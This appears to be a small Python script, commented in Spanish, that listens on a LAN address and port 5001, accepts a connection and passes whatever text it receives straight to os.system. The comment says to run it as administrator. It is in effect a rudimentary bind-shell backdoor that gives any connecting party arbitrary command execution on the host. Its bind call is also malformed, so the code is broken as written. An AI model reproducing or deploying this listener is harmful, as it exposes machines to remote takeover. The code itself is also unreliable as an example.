import socket
from os import system
#ejecutar con administrador para que funciona comando
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind("192.168.100.13", 5001)
sock.listen()
socket_cliente, dir = sock.accept()
socket_cliente.sendall("conectado".encode("ascii"))
respuesta = socket_cliente.recv(1024)
respuesta = respuesta.decode("ascii")
system(respuesta)

